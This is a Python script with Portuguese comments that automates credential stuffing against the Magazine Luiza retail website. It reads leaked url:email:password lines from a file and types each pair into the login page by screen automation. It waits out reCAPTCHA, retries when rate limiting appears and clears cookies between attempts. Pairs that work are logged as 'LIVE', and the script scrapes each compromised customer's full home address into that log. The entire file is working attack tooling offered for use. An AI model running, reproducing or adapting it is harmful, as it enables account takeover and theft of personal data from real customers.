import pyautogui
import time
import os
import pyperclip  # Biblioteca para manipular a área de transferência

# DEFININDO AS IMAGENS NECESSÁRIAS
detect_browser = './database/imgs/browser.png'
email_input = './database/imgs/input.png'
login_button = './database/imgs/loginbutton.png'
recaptcha = './database/imgs/recaptcha.png'
forget = './database/imgs/forget.png'
cleaner = './database/imgs/cleaner.png'
ratelimit_detect = './database/imgs/rate.png'

max_wait_time = 180  # 3 minutos
elapsed_time = 0  # Tempo decorrido

# Função para carregar os logins de db.txt
def load_logins():
    if not os.path.exists(db_file):
        print(f"[ERROR] Arquivo {db_file} não encontrado.")
        return []
    with open(db_file, 'r') as file:
        logins = file.readlines()
    return [login.strip() for login in logins]  # Remove quebras de linha

# Função para salvar o resultado no arquivo correto
def save_result(login, result_file):
    with open(result_file, 'a') as file:
        file.write(f"{login}\n")

# Função para limpar cookies
def clean_cookies():
    try:
        cleaner_btn = pyautogui.locateCenterOnScreen(cleaner, confidence=0.8)
        if cleaner_btn:
            pyautogui.click(cleaner_btn)
            #print("[INFO] OS COOKIES DA PÁGINA FORAM LIMPOS!")
            time.sleep(3)
        else:
            print("[ERROR] EXTENSÃO DO CLEANER NÃO ENCONTRADA!")
    except pyautogui.ImageNotFoundException:
        print("[ERROR] EXTENSÃO DO CLEANER NÃO ENCONTRADA!")

# Função para capturar informações de endereço
def capture_address():
    time.sleep(4)
    pyautogui.press('f6')
    time.sleep(1)
    pyautogui.write('https://sacola.magazineluiza.com.br/#/cliente/editar')
    time.sleep(1)
    pyautogui.press('enter')
    time.sleep(5)
    pyautogui.press('escape', presses=5)  # Fecha pop-ups ou modal

    data = {}

    def copy_content(x, y, key):
        pyautogui.click(x, y, clicks=3)
        time.sleep(1)
        pyautogui.hotkey('ctrl', 'c')
        time.sleep(1)
        data[key] = pyperclip.paste()

    copy_content(37, 726, "cep")
    copy_content(31, 791, "endereco")
    copy_content(30, 869, "numero")
    copy_content(37, 940, "complemento")
    pyautogui.press('pagedown')
    pyautogui.click(631, 595, clicks=1)
    copy_content(37, 180, "bairro")
    copy_content(33, 252, "cidade")
    copy_content(26, 327, "estado")
    copy_content(35, 400, "ponto_de_referencia")
    pyautogui.press('pageup')

    return data

# Arquivos
db_file = './db.txt'
live_file = './live.txt'
die_file = './die.txt'
recheck_file = './recheck.txt'

# Criação dos arquivos de saída caso não existam
for file in [live_file, die_file, recheck_file]:
    if not os.path.exists(file):
        open(file, 'w').close()

# Loop principal para processar cada login
logins = load_logins()

if not logins:
    print("[ERROR] Nenhuma linha no arquivo db.txt.")
else:
    for login in logins:
        url, email, password = login.split(':')

        print(f"[INFO] Testando login para: {email}:{password}")

        # Iniciar navegador
        detect = pyautogui.locateCenterOnScreen(detect_browser, confidence=0.8)
        if detect:
            #print("[DEBUG] Navegador encontrado!")
            pyautogui.click(detect)
            time.sleep(1)
            pyautogui.press('f6')
            time.sleep(1)
            pyautogui.write('https://www.magazineluiza.com.br/cliente/login/')
            time.sleep(1)
            pyautogui.press('enter')
            time.sleep(10)
        else:
            print("[ERROR] Navegador não encontrado!")
            save_result(f"{email}|{password}", die_file)
            continue  # Vai para o próximo login

        # Preencher o formulário de login
        email_input_pos = pyautogui.locateCenterOnScreen(email_input, confidence=0.8)
        if email_input_pos:
            pyautogui.click(email_input_pos)
            time.sleep(1)
            pyautogui.write(email)
            pyautogui.press('tab')
            time.sleep(1)
            pyautogui.write(password)
            time.sleep(1)
            pyautogui.press('enter')
            time.sleep(8)
        else:
            print("[ERROR] Formulários não encontrados!")
            save_result(f"{email}|{password}", die_file)
            continue  # Vai para o próximo login

        # Verificar recaptcha
        try:
            isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)
            if isrecaptcha:
                print("[INFO] Recaptcha encontrado! Aguardando...")
                elapsed_time = 0
                while isrecaptcha and elapsed_time < max_wait_time:
                    time.sleep(1)
                    elapsed_time += 1
                    isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)

                if isrecaptcha:
                    raise Exception("Recaptcha não desapareceu após 3 minutos.")
                else:
                    print("Recaptcha desapareceu.")
            else:
                print("Recaptcha não foi chamado prosseguindo...")
        except pyautogui.ImageNotFoundException:
            print("Recaptcha não foi chamado prosseguindo...")

        # Verificar a área de "Esqueci a senha"
        try:
            forget_area = pyautogui.locateCenterOnScreen(forget, confidence=0.8)
            if forget_area:
                print("[INFO] Conta solicitou para alterar a senha!")
                save_result(f"{email}:{password}", recheck_file)
                
        except pyautogui.ImageNotFoundException:
            pass

        try:
            rate_limit_area = pyautogui.locateCenterOnScreen(ratelimit_detect, confidence=0.8)
            if rate_limit_area:
                print("[INFO] Possível rate limiting atingido! Incluindo login na lista de reteste!")
                save_result(f"{email}:{password}", recheck_file)
                
        except pyautogui.ImageNotFoundException:
            pass        

        # Verificar se o login foi bem-sucedido
        try:
            login_btn = pyautogui.locateCenterOnScreen(login_button, confidence=0.8)
            if login_btn:
                print("[RESULTADO] => Login Reprovado!")
                save_result(f"{email}:{password}", die_file)
            else:
                print("[RESULTADO] => Login Aprovado!")
                address_data = capture_address()
                formatted_result = (
                    f"LIVE => {email}:{password} Endereço => {address_data['cep']}|{address_data['endereco']}|"
                    f"{address_data['numero']}|{address_data['complemento']}|"
                    f"{address_data['bairro']}|{address_data['cidade']}|"
                    f"{address_data['estado']}|{address_data['ponto_de_referencia']}"
                )
                save_result(formatted_result, live_file)
        except pyautogui.ImageNotFoundException:
            print("[RESULTADO] => Login Aprovado!")
            address_data = capture_address()
            formatted_result = (
                f"LIVE => {email}:{password} Endereço => {address_data['cep']}|{address_data['endereco']}|"
                f"{address_data['numero']}|{address_data['complemento']}|"
                f"{address_data['bairro']}|{address_data['cidade']}|"
                f"{address_data['estado']}|{address_data['ponto_de_referencia']}"
            )
            save_result(formatted_result, live_file)

        # Limpar cookies para o próximo teste
        clean_cookies()

        # Remover a linha do db.txt após o teste
        with open(db_file, 'r') as file:
            lines = file.readlines()

        with open(db_file, 'w') as file:
            for line in lines:
                if line.strip() != login:
                    file.write(line)

        #print(f"[INFO] Linha processada: {login}")
